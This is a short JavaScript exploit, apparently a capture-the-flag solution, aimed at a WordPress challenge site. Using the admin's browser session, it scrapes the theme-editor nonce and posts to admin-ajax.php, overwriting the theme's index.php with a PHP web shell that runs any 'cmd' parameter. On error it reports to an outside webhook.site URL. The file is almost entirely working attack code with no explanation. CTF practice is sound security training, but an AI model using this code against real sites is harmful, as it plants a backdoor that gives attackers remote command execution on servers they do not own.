async function pepe(){
    var a = await fetch('https://bd4b67cc1320abe3c5966500-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
    console.log(a);
    return a;
}

try{
var a = await pepe();

fetch("https://bd4b67cc1320abe3c5966500-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/admin-ajax.php", {
    "headers":{"Content-type":"application/x-www-form-urlencoded"},
"body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
}catch(err){
    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);
}
